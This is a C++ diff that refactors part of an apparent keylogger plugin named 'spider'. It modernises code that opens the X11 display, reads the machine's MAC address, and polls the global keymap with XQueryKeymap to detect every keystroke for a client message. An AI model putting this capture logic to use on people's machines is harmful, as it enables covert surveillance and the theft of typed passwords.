@@ -139,7 +139,7 @@ namespace spider
           // {VK_OEM_7, KeyboardKey::KB_SIMPLEQUOTE}   // " if shift
       };
 
-      Display *_Xdisplay = NULL;
+      Display *_Xdisplay = nullptr;
       Window   _Xroot_win = 0;
 
       bool SpiderPlugin::initLinux()
@@ -150,14 +150,21 @@ namespace spider
 	MacAddress::get(m_macAddr);
 
 	// Init Window and Screen
-	if (!(_Xdisplay = XOpenDisplay(NULL)))
-	  return false;
+	_Xdisplay = XOpenDisplay(nullptr);
+	if (!_Xdisplay)
+	  {
+	    return false;
+	  }
 	Screen *screen = XScreenOfDisplay(_Xdisplay, DefaultScreen(_Xdisplay));
 	if (!screen)
-	  return false;
+	  {
+	    return false;
+	  }
 	_Xroot_win = RootWindow(_Xdisplay, XScreenNumberOfScreen(screen));
 	if (!_Xroot_win)
-	  return false;
+	  {
+	    return false;
+	  }
 	return true;
       }
 
@@ -251,21 +258,21 @@ namespace spider
 
 	    spider::client::SystemMsg msg;
 
-	    static char szKey[32];
-	    static char szKeyOld[32] = {0};
+	    static std::array<char, 32>            szKey{};
+	    static std::array<char, sizeof(szKey)> szKeyOld{};
 
 	    static char szBit = 0;
 	    static char szBitOld = 0;
 	    static int  iCheck = 0;
 
 	    static char  szKeysym = 0;
-	    static char *szKeyString = NULL;
+	    static char *szKeyString = nullptr;
 
 	    int iKeyCode = 0;
 	    int iReverToReturn = 0;
 
-	    XQueryKeymap(_Xdisplay, szKey);
-	    if (memcmp(szKey, szKeyOld, 32))
+	    XQueryKeymap(_Xdisplay, szKey.data());
+	    if (std::memcmp(szKey.data(), szKeyOld.data(), sizeof(szKey)))
 	      {
 		for (size_t i = 0; i < sizeof(szKey); i++)
 		  {
@@ -307,7 +314,7 @@ namespace spider
 		      }
 		  }
 	      }
-	    memcpy(szKeyOld, szKey, 32);
+	    std::memcpy(szKeyOld.data(), szKey.data(), sizeof(szKey));
 	  }
 
 	// Mouse
